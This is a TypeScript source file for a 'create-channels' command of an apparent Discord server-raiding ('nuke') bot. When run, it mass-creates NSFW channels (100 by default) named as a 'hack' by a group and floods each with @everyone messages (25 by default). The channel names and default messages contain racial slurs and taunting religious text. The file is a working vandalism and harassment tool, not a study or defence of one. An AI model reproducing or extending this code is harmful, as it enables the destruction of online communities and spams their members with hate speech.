import { Command } from '../../KINGMAN_NUKE/types/KING-NUKE';
export default {
    name: "create-channels",
    description: "",
    run: async(client, kmsg, args, kingman)=> {
        if(!client.config.devs.includes(kmsg.author.id)) return;
        if(!kmsg.guild) return;
        let ops = { 
            channels: {
                name: "hacked by MIDNIGHT STORM NIGGAS",
                nsfw: true,
                number: Number(args[0]) || 100,
                topic: "GET HACKED YA ALLAH :)"
            },
            messages: {
                content: args.slice(2).join(" ") || "> @everyone **HAHAHAHHAHAHAHAH [niggers]nah nah midnight storm ontop)**",
                number: Number(args[1]) || 25
            }
        }
        await kingman.CreateChannels(kmsg.guild, ops).catch(e=> {
            console.log(e)
        })
    } 
} as Command
